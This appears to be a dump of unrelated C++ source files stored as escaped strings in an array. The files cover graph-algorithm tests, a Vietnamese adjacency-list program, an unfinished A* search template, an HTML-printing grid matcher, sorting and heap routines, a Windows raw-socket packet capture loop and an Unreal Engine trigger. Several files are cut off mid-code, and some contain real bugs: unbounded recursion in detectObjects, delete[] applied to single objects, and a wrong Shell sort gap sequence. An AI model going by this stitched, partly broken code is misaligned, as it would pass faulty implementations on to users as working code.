isContainsCycle\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 1, 0},\n            {1, 0, 1},\n            {0, 1, 0}};\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::isContainsCycle(g) == \"0\");\n\n        vector<vector<int>> graph2 = {\n            {0, 1, 1, 0, 0},\n            {1, 0, 1, 0, 0},\n            {1, 1, 0, 1, 0},\n            {0, 0, 1, 0, 0},\n            {0, 0, 0, 0, 0}};\n\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::isContainsCycle(g) == \"Graph contains a cycle: 0->1->2->0\");\n}\nTEST_CASE(\"Test isBipartite\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 1, 0},\n            {1, 0, 1},\n            {0, 1, 0}};\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::isBipartite(g) == \"Graph is Bipartite and those are the two sets: A={0,2} B={1}\");\n\n        vector<vector<int>> graph2 = {\n            {0, 1, 1, 0, 0},\n            {1, 0, 1, 0, 0},\n            {1, 1, 0, 1, 0},\n            {0, 0, 1, 0, 0},\n            {0, 0, 0, 0, 0}};\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::isBipartite(g) == \"Graph is not Bipartite\");\n\n        vector<vector<int>> graph3 = {\n            {0, 1, 2, 0, 0},\n            {1, 0, 3, 0, 0},\n            {2, 3, 0, 4, 0},\n            {0, 0, 4, 0, 5},\n            {0, 0, 0, 5, 0}};\n        g.loadGraph(graph3);\n        CHECK(ariel::Algorithms::isBipartite(g) == \"Graph is not Bipartite\");\n\n        vector<vector<int>> graph4 = {\n            {0, 0, 0},\n            {0, 0, 0},\n            {0, 0, 0}};\n        g.loadGraph(graph4);\n        CHECK(ariel::Algorithms::isBipartite(g) == \"Graph is Bipartite and those are the two sets: A={0} B={1,2}\");\n}\nTEST_CASE(\"Test invalid graph\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 1, 2, 0},\n            {1, 0, 3, 0},\n            {2, 3, 0, 4},\n            {0, 0, 4, 0},\n            {0, 0, 0, 5}};\n        CHECK_THROWS(g.loadGraph(graph));\n}\nTEST_CASE(\"Test Negative Cycle\")\n{\n        ariel::Graph g;\n        g.setIsDirected(true);\n        vector<vector<int>> graph = {\n            {0, -9, 0, 0},\n            {0, 0, -8, 0},\n            {0, 0, 0, -10},\n            {-7, 0, 0, 0},\n\n        };\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::negativeCycle(g) == \"Negative cycle detected\");\n}\nTEST_CASE(\"Test Directed and Undirected Graphs\")\n{\n        ariel::Graph g;\n        vector<vector<int>> graph = {\n            {0, 0, 0, 8},\n            {0, 0, 0, 8},\n            {0, 0, 0, 8},\n            {8, 8, 8, 0}};\n        g.loadGraph(graph);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n        CHECK(ariel::Algorithms::isContainsCycle(g) == \"0\");\n\n        vector<vector<int>> graph2 = {\n            {0, 0, 0, 7},\n            {0, 0, 0, 8},\n            {0, 0, 0, 8},\n            {8, 8, 8, 0}};\n        g.setIsDirected(true);\n        g.loadGraph(graph2);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n        CHECK(ariel::Algorithms::isContainsCycle(g) != \"0\");\n\n        vector<vector<int>> graph3 = {\n            {0, 2},\n            {0, 0}};\n        g.loadGraph(graph3);\n        CHECK(ariel::Algorithms::isConnected(g) == false);\n        CHECK(ariel::Algorithms::isContainsCycle(g) == \"0\");\n\n        vector<vector<int>> graph4 = {\n            {0, 2},\n            {2, 0}};\n        g.loadGraph(graph4);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n        CHECK(ariel::Algorithms::isContainsCycle(g) != \"0\");\n\n        vector<vector<int>> graph5 = {\n            {0, 2},\n            {4, 0}};\n        g.loadGraph(graph5);\n        CHECK(ariel::Algorithms::isConnected(g) == true);\n        CHECK(ariel::Algorithms::isContainsCycle(g) != \"0\");\n        CHECK(ariel::Algorithms::isBipartite(g) =",
    "\ufeff#include \"iostream\"\n#include \"fstream\"\nusing namespace std;\nconst int maxDinh = 20;\n\nstruct node {\n\tint dinhKe;\n\tint trongSo;\n\tnode* link;\n};\n\nstruct danhSachKe {\n\tnode* dsk[maxDinh];\n\tint soDinh; // s\u1ed1 \u0111\u1ec9nh c\u1ee7a graph\n};\n\nvoid readFile(danhSachKe& list) {\n\tifstream inFile(\"Text.txt\");\n\tif (!inFile.is_open()) {\n\t\tcout << \"\\nKhong the mo tep.\";\n\t\treturn;\n\t}\n\t// cho danh s\u00e1ch = null h\u1ebft\n\tfor (int i = 0; i < maxDinh; i++)\n\t\tlist.dsk[i] = NULL;\t\n\t// Nhap s\u1ed1 \u0111\u1ec9nh t\u1ed5ng\n\tinFile >> list.soDinh;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tint soDinhKe;\n\t\tinFile >> soDinhKe;\n\t\tfor (int j = 0; j < soDinhKe; j++) {\n\t\t\tnode* newNode = new node();\n\t\t\tinFile >> newNode->dinhKe;\n\t\t\tinFile >> newNode->trongSo;\n\t\t\tnewNode->link = NULL;\n\t\t\t// Th\u00eam v\u00e0o single list theo \u0111\u1ec9nh t\u01b0\u01a1ng \u1ee9ng \n\t\t\tif (list.dsk[i] == NULL)  // ch\u01b0a c\u00f3 \u0111\u1ec9nh k\u1ec1 n\u00e0o h\u1ebft \n\t\t\t\tlist.dsk[i] = newNode;\n\t\t\telse { // \u0111\u00e3 c\u00f3 \u0111\u1ec9nh k\u1ec1 tr\u01b0\u1edbc \u0111\u00f3 th\u00eam v\u00e0o cu\u1ed1i single list \n\t\t\t\tnode* temp = list.dsk[i];\n\t\t\t\twhile (temp->link != NULL)\n\t\t\t\t\ttemp = temp->link;\n\t\t\t\ttemp->link = newNode;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid xuatDanhSachKe(danhSachKe list) {\n\tcout << \"GRAPH\";\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tcout << \"\\n(\" << i << \"): \";\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tcout << \"(\" << pointer->dinhKe << \",\" << pointer->trongSo << \") \";\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n}\n\nint demSoCanh(danhSachKe list) {\n\tint count = 0;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tcount++;\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n\treturn count;\n}\n\nint tinhBacRa(danhSachKe list, int u) {\n\tint count = 0;\n\tnode* pointer = list.dsk[u];\n\twhile (pointer)\n\t{\n\t\tcount++;\n\t\tpointer = pointer->link;\n\t}\n\treturn count;\n}\n\nint tinhBacVao(danhSachKe list, int u) {\n\tint count = 0;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tif (pointer->dinhKe == u) {\n\t\t\t\tcount++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n\treturn count;\n}\n\nbool canhCoTrongSoLonNhat(danhSachKe list, int& u, int& v) {\n\tnode* max = NULL;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tnode* pointer = list.dsk[i];\n\t\twhile (pointer) {\n\t\t\tif (max == NULL) {\n\t\t\t\tu = i;\n\t\t\t\tmax = pointer;\n\t\t\t}\n\t\t\telse if (pointer->trongSo > max->trongSo) {\n\t\t\t\tu = i;\n\t\t\t\tmax = pointer;\n\t\t\t}\n\t\t\tpointer = pointer->link;\n\t\t}\n\t}\n\n\tif (max == NULL)\n\t\treturn false;\n\telse {\n\t\tv = max->dinhKe;\n\t\treturn true;\n\t}\n}\n\nint main() {\n\tdanhSachKe list;\n\treadFile(list);\n\txuatDanhSachKe(list);\n\tcout << \"\\nTong so canh: \" << demSoCanh(list);\n\tcout << \"\\nBac ra cua 5: \" << tinhBacRa(list, 5);\n\tcout << \"\\nBac vao cua 5: \" << tinhBacVao(list, 5);\n\tint u, v;\n\tif (canhCoTrongSoLonNhat(list, u, v))\n\t\tcout << \"\\nCanh co trong so lon nhat: (\" << u << \",\" << v << \")\";\n\telse\n\t\tcout << \"\\nKhong co canh\";\n}",
    "#include<vector>\n#include<iostream>\n#include<queue>\n#include<map>\n#include<fstream>\n#include<sstream>\n#include<string>\n\nusing namespace std;\n\nstruct Map_Cell\n{\n    int type;\n    // TODO: \u5b9a\u4e49\u5730\u56fe\u4fe1\u606f\n\n};\n\nstruct Search_Cell\n{\n    int h;\n    int g;\n    // TODO: \u5b9a\u4e49\u641c\u7d22\u72b6\u6001\n\n};\n\n// \u81ea\u5b9a\u4e49\u6bd4\u8f83\u51fd\u6570\u5bf9\u8c61\uff0c\u6309\u7167 Search_Cell \u7ed3\u6784\u4f53\u7684 g + h \u5c5e\u6027\u8fdb\u884c\u6bd4\u8f83\nstruct CompareF {\n    bool operator()(const Search_Cell *a, const Search_Cell *b) const {\n        return (a->g + a->h) > (b->g + b->h); // \u8f83\u5c0f\u7684 g + h \u503c\u4f18\u5148\u7ea7\u66f4\u9ad8\n    }\n};\n\n// TODO: \u5b9a\u4e49\u542f\u53d1\u5f0f\u51fd\u6570\nvoid Heuristic_Funtion()\n{\n    return;\n}\n\nvoid Astar_search(const string input_file, int &step_nums, string &way)\n{\n    ifstream file(input_file);\n    if (!file.is_open()) {\n        cout << \"Error opening file!\" << endl;\n        return;\n    }\n\n    string line;\n    getline(file, line); // \u8bfb\u53d6\u7b2c\u4e00\u884c\n    stringstream ss(line);\n    string word;\n    vector<string> words;\n    while (ss >> word) {\n        words.push_back(word);\n    }\n    int M = stoi(words[0]);\n    int N = stoi(words[1]);\n    int T = stoi(words[2]);\n\n    pair<int, int> start_point; // \u8d77\u70b9\n    pair<int, int> end_point;   // \u7ec8\u70b9\n    Map_Cell **Map = new Map_Cell *[M];\n    // \u52a0\u8f7d\u5730\u56fe\n    for(int i = 0; i < M; i++)\n    {\n        Map[i] = new Map_Cell[N];\n        getline(file, line);\n        stringstream ss(line);\n        string word;\n        vector<string> words;\n        while (ss >> word) {\n            words.push_back(word);\n        }\n        for(int j = 0; j < N; j++)\n        {\n            Map[i][j].type = stoi(words[j]);\n            if(Map[i][j].type == 3)\n            {\n                start_point = {i, j};\n            }\n            else if(Map[i][j].type == 4)\n            {\n                end_point = {i, j};\n            }\n        }\n    }\n    // \u4ee5\u4e0a\u4e3a\u9884\u5904\u7406\u90e8\u5206\n    // ------------------------------------------------------------------\n\n    Search_Cell *search_cell = new Search_Cell;\n    search_cell->g = 0;\n    search_cell->h = 0; // Heuristic_Funtion();\n\n    priority_queue<Search_Cell *, vector<Search_Cell *>, CompareF> open_list;\n    vector<Search_Cell *> close_list;\n    open_list.push(search_cell);\n\n    while(!open_list.empty())\n    {\n        // TODO: A*\u641c\u7d22\u8fc7\u7a0b\u5b9e\u73b0\n\n    }\n\n    // ------------------------------------------------------------------\n    // TODO: \u586b\u5145step_nums\u4e0eway\n    step_nums = -1;\n    way = \"\";\n\n    // ------------------------------------------------------------------\n    // \u91ca\u653e\u52a8\u6001\u5185\u5b58\n    for(int i = 0; i < M; i++)\n    {\n        delete[] Map[i];\n    }\n    delete[] Map;\n    while(!open_list.empty())\n    {\n        auto temp = open_list.top();\n        delete[] temp;\n        open_list.pop();\n    }\n    for(int i = 0; i < close_list.size(); i++)\n    {\n        delete[] close_list[i];\n    }\n\n    return;\n}\n\nvoid output(const string output_file, int &step_nums, string &way)\n{\n    ofstream file(output_file);\n    if(file.is_open())\n    {\n        file << step_nums << endl;\n        if(step_nums >= 0)\n        {\n            file << way << endl;\n        }\n\n        file.close();\n    }\n    else\n    {\n        cerr << \"Can not open file: \" << output_file << endl;\n    }\n    return;\n}\n\nint main(int argc, char *argv[])\n{\n    string input_base = \"../input/input_\";\n    string output_base = \"../output/output_\";\n    // input_0\u4e3a\u8bb2\u4e49\u6837\u4f8b\uff0c\u6b64\u5904\u4e0d\u505a\u6d4b\u8bd5\n    for(int i = 1; i < 11; i++)\n    {\n        int step_nums = -1;\n        string way = \"\";\n        Astar_search(input_base + to_string(i) + \".txt\", step_nums, way);\n        output(output_base + to_string(i) + \".txt\", step_nums, way);\n    }\n    return 0;\n}",
    "#include \"functions.h\"\n#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\ntemplate<typename T>\nvoid detectObjects(vector<vector<T> >& grid, int x, int y, const int width, const int height, Object& p1, int& objectCount, vector<vector<bool> >& visited) {\n    visited[x][y] = true;\n    grid[x][y] = p1.id;\n\n    detectObjects(grid, x + 1, y, width, height, p1, objectCount, visited);\n    return;\n}\n\nint s_to_int(const string& y) {\n    return stoi(y);\n}\n\nbool is_notdigit(string arr)\n{\n        for (int k = 0; k < arr.length(); k++) {\n                if ((int)arr[k]<(int)'0' ||\n                        (int)arr[k]>(int)'9') {\n                        return true;\n                }\n        }\n        return false;\n}\n\nbool isNumber(const string& str) {\n    for (char c : str) {\n        if (!isdigit(c)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nvoid searchAndMarkPattern(vector<vector<char>>& textGrid, const string& input, int& objectCount, vector<vector<bool>>& visited, int numrows, int numcols, char count, int userinput) {\n\n        cout << \"<table class='center'>\";\n        // Loop through the grid\n        for (int i = 0; i < numrows; i++) {\n                for (int j = 0; j < numcols; j++) {\n                        // Set object ID based on objectCount\n                        if (objectCount <= 9) {\n                                count = static_cast<char>(objectCount + 48); // For numbers 0 to 9\n                        } else {\n                                count = 'A' + (objectCount - 10);\n                        }\n\n                        // Check if the current cell has been visited\n                        if (!visited[i][j]) {\n                                bool match = true;\n\n                                // Check if the pattern matches starting from (i, j)\n                                for (int l = 0; l < input.size(); ++l) {\n                                        if (textGrid[i][j + l] != input[l]) {\n                                                match = false;\n                                                cout << \"<td>\"  << textGrid[i][j] << \"</td>\" << endl;\n                                                visited[i][j + l] = true;\n                                                break;\n                                        } else {\n                                                // Mark the pattern cells and update objectCount\n                                                for (int k = 0; k < input.size(); ++k) {\n                                                if (textGrid[i][j + k] == input[k]) {\n                                                        textGrid[i][j + k] = count;\n                                                        visited[i][j + k] = true;\n                                                        cout << \"<td style='color:#FF0000'>\" << textGrid[i][j + k] << \"</td>\" << endl;\n                                                } else {\n                                                        break;\n                                                }\n                                                }\n                                                objectCount++;\n                                        }\n                                        \n                                        // Handle boundary conditions\n                                        if (j > numcols) {\n                                                ++i;\n                                                j = 0;\n                                        }\n                                        if (i > numrows) {\n                                                break;\n                                        }\n                                }\n                        }\n                }\n                cout << \"</tr>\";\n        }\n        cout << \"</table>\";\n        cout << \"<br>\";\n        cout << \"Your guess is \" << userinput;\n        cout << \"<br>\";\n        cout << \"There are \" << objectCount - 1 << \", \" << input << \" characters!\";\n\n        if(userinput == objectCount - 1){\n                cout << \"<br>\";\n                cout << \"Congratulations! You were correct.\";\n        }else{\n                cout << \"<br>\";\n                cout << \"Try Again...\";\n        }\n        \n}\n\nvoid displayMatchingValuesAtSamePosition(const vector<vector<char>>& vec1, const vector<vector<char>>& vec2) {\n    // Check if the vectors have the same size\n    int countmatches = 0;\n\n    cout << \"<table class='center'>\";\n\n    for (size_t i = 0; i < vec1.size(); ++i) {\n        cout << \"<tr>\";\n        for (size_t j = 0; j < vec1[i].size(); ++j) {\n            // Check if the values at the current position match\n            if (vec1[i][j] == vec2[i][j]) {\n                cout << \"<td style='color:#0000FF; font-weight:bold;'>\" << vec1[i][j] << \"</td> \";\n                countmatches++;\n            } else {\n                // Display the non-matching value in black color\n                cout << \"<td>\" << vec1[i][j] << \"</",
    "#include <bits/stdc++.h>\r\n#define MAXSIZE 10\r\nusing namespace std;\r\n\r\nvoid iniArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = rand() % 20;\r\n\t}\r\n}\r\n\r\nvoid showArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tcout << arr[i] << \" \";\r\n\t}\r\n\tcout << endl << \"------------\";\r\n}\r\n\r\n//\u5192\u6ce1\u6392\u5e8f\r\nvoid bubSort(int arr[], int length) {\r\n\twhile (length--)\r\n\t{\r\n\t\tfor (int i = 0; i < length; i++) {\r\n\t\t\tif (arr[i + 1] < arr[i]) {\r\n\t\t\t\tint temp = arr[i + 1];\r\n\t\t\t\tarr[i + 1] = arr[i];\r\n\t\t\t\tarr[i] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//\u9009\u62e9\u6392\u5e8f\r\nvoid selectSort(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tint k = i;\r\n\t\tfor (int j = i + 1; j < length; j++) {\r\n\t\t\tif (arr[j] < arr[k]) {\r\n\t\t\t\tk = j;\r\n\t\t\t}\r\n\t\t}\r\n\t\tint temp = arr[i];\r\n\t\tarr[i] = arr[k];\r\n\t\tarr[k] = temp;\r\n\r\n\t}\r\n}\r\n\r\n\r\n//\u63d2\u5165\u6392\u5e8f\r\nvoid insertSort(int arr[], int length) {\r\n\tfor (int i = 1; i < length; i++) {\r\n\t\tint key = arr[i];\r\n\t\tint j = i - 1;\r\n\r\n\t\t// \u5c06\u5143\u7d20arr[i]\u63d2\u5165\u5230\u5df2\u6392\u5e8f\u7684\u5e8f\u5217arr[0..i-1]\u4e2d  \r\n\t\twhile (j >= 0 && arr[j] > key) {\r\n\t\t\tarr[j + 1] = arr[j];\r\n\t\t\tj--;\r\n\t\t}\r\n\t\tarr[j + 1] = key;\r\n\t}\r\n}\r\n\r\n//\u63d2\u5165\u65b0\u7684\u5143\u7d20\r\nvoid insertElement(int arr[], int length, int newElement) {\r\n\tint i;\r\n\tfor (i = length - 1; (i >= 0 && arr[i] > newElement); i--) {\r\n\t\tarr[i + 1] = arr[i]; // \u5c06\u5143\u7d20\u5411\u540e\u79fb\u52a8  \r\n\t}\r\n\tarr[i + 1] = newElement; // \u63d2\u5165\u65b0\u5143\u7d20  \r\n\r\n\t// \u6ce8\u610f\uff1a\u7531\u4e8e\u6570\u7ec4\u5927\u5c0f\u56fa\u5b9a\uff0c\u8fd9\u91cc\u7684\u201c\u63d2\u5165\u201d\u5b9e\u9645\u4e0a\u662f\u8986\u76d6\u4e86\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002  \r\n\t// \u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u91cd\u65b0\u5206\u914d\u6570\u7ec4\u7684\u5927\u5c0f\u6765\u771f\u6b63\u63d2\u5165\u4e00\u4e2a\u65b0\u5143\u7d20\u3002  \r\n}\r\n\r\n//\u5e0c\u5c14\u6392\u5e8f\r\nvoid shellSort(int arr[], int length) {\r\n\tint h = 1;\r\n\tint t = length / 3;\r\n\twhile (h<t)\r\n\t{\r\n\t\th = 3 * h - 1;\r\n\t}\r\n\twhile (h >= 1) {\r\n\t\tfor (int i = h; i < length; i++) {\r\n\t\t\tfor (int j = i; j >= h && arr[j] < arr[j - h]; j--) {\r\n\t\t\t\tint temp = arr[j];\r\n\t\t\t\tarr[j] = arr[j - h];\r\n\t\t\t\tarr[j - h] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t\th /= 3;\r\n\t}\r\n}\r\n\r\n//\u5feb\u901f\u6392\u5e8f\r\nvoid quickSort(int arr[], int left, int right) {\r\n\tif (left >= right) {\r\n\t\treturn;\r\n\t}\r\n\tint i = left;\r\n\tint j = right;\r\n\tint pivot = arr[i];\r\n\twhile (i < j)\r\n\t{\r\n\t\twhile (i < j && arr[j] >= pivot)\r\n\t\t\tj--;\r\n\t\t\tarr[i] = arr[j];\r\n\t\twhile (i < j && arr[i] <= pivot)\r\n\t\t\t\t\ti++;\r\n\t\t\tarr[j] = arr[i];\r\n\t}\r\n\t//\u5f53j=i\u65f6\uff0c\u8f74\u786e\u5b9a\r\n\tarr[i] = pivot;\r\n\tquickSort(arr, left, i - 1);\r\n\tquickSort(arr, i + 1, right);\r\n}\r\n\r\n//\u5f52\u5e76\u6392\u5e8f\r\n//\u9ed8\u8ba4\u5e8f\u5217a\u4e0e\u5e8f\u5217b\u90fd\u662f\u6709\u5e8f\u5e8f\u5217\r\nvoid mergesort1(int aArr[], int alen, int bArr[], int blen, int* temp) {\r\n\tint i = 0;\r\n\tint j = 0;\r\n\tint k = 0;\r\n\twhile (i < alen && j < blen)\r\n\t{\r\n\t\t//\u4f7f\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26\u4f7f\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\r\n\t\ttemp[k++] = aArr[i] < bArr[j] ? aArr[i++] : bArr[j++];\r\n\t}\r\n\twhile (i < alen)\r\n\t{\r\n\t\ttemp[k++] = aArr[i++];\r\n\t}\r\n\twhile (j < blen)\r\n\t{\r\n\t\ttemp[k++] = bArr[j++];\r\n\t}\r\n}\r\n\r\n//\u65e0\u5e8f\u5e8f\u5217\uff0c\u5c06\u5176\u62c6\u5206\u5f00\uff0c\u8ba9\u5176\u6210\u4e3a\u6709\u5e8f\u7684\u591a\u4e2a\u5e8f\u5217\r\nvoid merge(int arr[], int low, int mid, int higth, int* temp) {\r\n\tint i = low;\r\n\tint j = mid + 1;\r\n\tint k = low;\r\n\twhile (i <= mid && j <= higth)\r\n\t{\r\n\t\ttemp[k++] = arr[i] < arr[j] ? arr[i++] : arr[j++];\r\n\t}\r\n\twhile (i <= mid) {\r\n\t\ttemp[k++] = arr[i++];\r\n\t}\r\n\twhile (j <= higth) {\r\n\t\ttemp[k++] = arr[j++];\r\n\t}\r\n\tfor (i = low; i <= higth; i++) {\r\n\t\tarr[i] = temp[i];\r\n\t}\r\n}\r\n\r\nvoid merge_sort(int arr[], int low, int higth, int* temp) {\r\n\tif (low >= higth) {\r\n\t\treturn;\r\n\t}\r\n\tint mid = low + (higth - low) / 2;//(low+higth)/2;\r\n\tmerge_sort(arr, low, mid, temp);\r\n\tmerge_sort(arr, mid + 1, higth, temp);\r\n\tmerge(arr, low, mid, higth, temp);\r\n}\r\n\r\nvoid mergesort2(int arr[], int length) {\r\n\tint* temp = new int[length];\r\n\tassert(temp);\r\n\tmerge_sort(arr, 0, length - 1, temp);\r\n\tdelete[] temp;\r\n}\r\n\r\n//\u5165\u5806\uff08\u5185\u5806\uff09\r\nvoid pushHeap(int* heap, int& size, int data) {\r\n\theap[size] = data;\r\n\tint current = size;\r\n\tint parent = (current - 1) / 2;\r\n\twhile (current > 0 && heap[current] < heap[parent]) {\r\n\t\tswap(heap[current], heap[parent]);\r\n\t\tcurrent = parent;\r\n\t\tparent = (current - 1) / 2;\r\n\t}\r\n\tsize++;\r\n}\r\n\r\n//\u51fa\u5806\uff08\u5185\u5806\uff09\r\nint popHeap(int* heap, int& size) {\r\n\tint val = heap[0];\r\n\theap[0] = heap[size - 1];\r\n\tsize--;\r\n\tint current = 0;\r\n\tint child = 2 * current + 1;\r\n\twhile (child < size) {\r\n\t\tif (child + 1 < size && heap[child + 1] < heap[child])\r\n\t\t\tchild++;\r\n\t\tif (heap[child] >= heap[current])\r\n\t\t\tbreak;\r\n\t\tswap(heap[child], heap[current]);\r\n\t\tcurrent = child;\r\n\t\tchild = 2 * current + 1;\r\n\t}\r\n\treturn val;\r\n}\r\n\r\n//\u5806\u6392\u5e8f\u5b9e\u73b0\uff08\u5185\u5806\uff09\r\nvoid heapsort1(int* arr, int length) {\r\n\tint* heap = new int[length];\r\n\tint heapSize = 0;\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tpushHeap(heap, heapSize, arr[i]);\r\n\t}\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = popHeap(heap, heapSize);\r\n\t}\r\n\tdelete[] heap;\r\n}\r\n\r\n// \u8c03\u6574\u5806\uff08\u5916\u5806\uff09\r\nvoid heapify(int arr[], int n, int i) {\r\n\tint largest = i;  // \u521d\u59cb\u5316\u6700\u5927\u5143\u7d20\u4e3a\u6839\u8282\u70b9\r\n\tint left = 2 * i + 1;  // \u5de6\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\tint right = 2 * i + 2;  // \u53f3\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\r\n\t// \u5982\u679c\u5de6\u5b50\u8282\u70b9\u5927\u4e8e\u6839\u8282\u70b9\r\n\tif (left < n && arr[left] > arr[largest]) {\r\n\t\tlargest = left;\r\n\t}\r\n\r\n\t// \u5982\u679c\u53f3\u5b50\u8282\u70b9\u5927\u4e8e\u5f53\u524d\u6700\u5927\u8282\u70b9\r\n\tif (right < n && arr[right] > arr[largest]) {\r\n\t\tlargest = right;\r\n\t}\r\n\r\n\t// \u5982\u679c\u6700\u5927\u8282\u70b9\u4e0d\u662f\u6839\u8282\u70b9\r\n\tif (largest != i) {\r\n\t\tswap(arr[i], arr[largest]);\r\n\t\t// \u9012\u5f52\u8c03\u6574\u5b50\u6811\r\n\t\theapify(arr, n, largest);\r\n\t}\r\n}\r\n\r\n// \u5806\u6392\u5e8f\uff08\u5916\u5806\uff09\r\nvoid heapSort(int arr[], int n) {\r\n\t// \u6784\u5efa\u6700\u5927\u5806\uff08\u4ece\u6700\u540e\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u5f00\u59cb\uff09\r\n\tfor (int i = n / 2 - 1; i >= 0; i--) {\r\n\t\theapify(arr, n, i);\r\n\t}\r\n\r\n\t// \u9010\u4e2a\u4ece\u5806\u9876\u53d6\u51fa\u5143\u7d20\uff0c\u653e\u5230\u5df2\u6392\u5e8f\u533a\u95f4\u672b\u5c3e\r\n\tfor (int i = n - 1; i > ",
    "#include \"sniffer.h\"\n#include <iostream>\n#include <queue>\n#include <sstream>\n#include <iomanip>\n#include <chrono>\n\nint main() {\n    WSADATA wsaData;\n    if (!initializeWinsock(wsaData)) {\n        return 1;\n    }\n\n    SOCKET sock = createRawSocket();\n    if (sock == INVALID_SOCKET) {\n        WSACleanup();\n        return 1;\n    }\n\n    if (!bindSocket(sock)) {\n        closesocket(sock);\n        WSACleanup();\n        return 1;\n    }\n\n    std::string fileName = generateFileName();\n    std::ofstream outputFile(fileName, std::ios::binary);\n    if (!outputFile) {\n        std::cerr << \"Failed to open output file\" << std::endl;\n        closesocket(sock);\n        WSACleanup();\n        return 1;\n    }\n\n    std::cout << \"Writing to file: \" << fileName << std::endl;\n\n    std::queue<std::pair<std::vector<char>, std::string>> packetQueue;\n    std::mutex queueMutex;\n    std::condition_variable cv;\n    bool done = false;\n\n    // Start writer thread\n    std::thread writerThread(packetWriter, std::ref(outputFile), std::ref(packetQueue), std::ref(queueMutex), std::ref(cv), std::ref(done));\n\n    // Start reader thread\n    std::thread readerThread(packetReader, std::ref(fileName), std::ref(queueMutex), std::ref(cv), std::ref(done));\n\n    // Buffer for incoming data\n    char buffer[65535];\n    char src_ip[INET_ADDRSTRLEN];\n    char dest_ip[INET_ADDRSTRLEN];\n    IPV4_HDR* ip_hdr;\n    int packetSize;\n\n    // Record start time\n    auto startTime = std::chrono::steady_clock::now();\n    auto endTime = startTime + std::chrono::minutes(2); // Two minutes duration\n\n    while (std::chrono::steady_clock::now() < endTime) {\n        if (receivePacket(sock, buffer, sizeof(buffer), src_ip, dest_ip, ip_hdr, packetSize)) {\n            std::vector<char> packet(buffer, buffer + packetSize);\n\n            // Generate packet info string\n            std::ostringstream info;\n            auto now = std::chrono::system_clock::now();\n            std::time_t now_c = std::chrono::system_clock::to_time_t(now);\n            info << std::put_time(std::localtime(&now_c), \"%T\") << \" \";\n            info << src_ip << \" \";\n            info << dest_ip << \" \";\n            info << (int)ip_hdr->ip_ttl << \" \";\n            info << (int)ip_hdr->ip_protocol << \" \";\n            info << ip_hdr->ip_total_length;\n\n            std::unique_lock<std::mutex> lock(queueMutex);\n            packetQueue.emplace(packet, info.str());\n            lock.unlock();\n            cv.notify_one();\n        }\n    }\n\n    // Signal writer and reader threads to finish\n    {\n        std::lock_guard<std::mutex> lock(queueMutex);\n        done = true;\n    }\n    cv.notify_all();\n\n    writerThread.join();\n    readerThread.join();\n\n    // Output remaining content from the file\n    std::ifstream inputFile(fileName, std::ios::binary);\n    if (inputFile) {\n        std::cout << \"Output from file after 2 minutes:\\n\";\n        std::cout << inputFile.rdbuf() << std::endl;\n        inputFile.close();\n    }\n    else {\n        std::cerr << \"Failed to open input file\" << std::endl;\n    }\n\n    closesocket(sock);\n    WSACleanup();\n    outputFile.close();\n    return 0;\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"Triggers/PlatformTrigger.h\"\n#include \"Props/MovingPlatform.h\"\n#include \"Components/BoxComponent.h\"\n\n\n// Sets default values\nAPlatformTrigger::APlatformTrigger()\n{\n\t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n\tTriggerBox = CreateDefaultSubobject<UBoxComponent>(TEXT(\"TriggerBox\"));\n\tif (!ensure(TriggerBox != nullptr)) return;\n\n\tPlatformMesh = CreateDefaultSubobject<UStaticMeshComponent>(TEXT(\"Platform\"));\n\tif (!ensure(PlatformMesh != nullptr)) return;\n\n\tRootComponent = TriggerBox;\n\tPlatformMesh->SetupAttachment(TriggerBox);\n\n\tPlayerOnTrigger = 0;\n\n\tTriggerBox->OnComponentBeginOverlap.AddDynamic(this, &APlatformTrigger::Activate);\n\tTriggerBox->OnComponentEndOverlap.AddDynamic(this, &APlatformTrigger::Deactivate);\n}\n\n// Called when the game starts or when spawned\nvoid 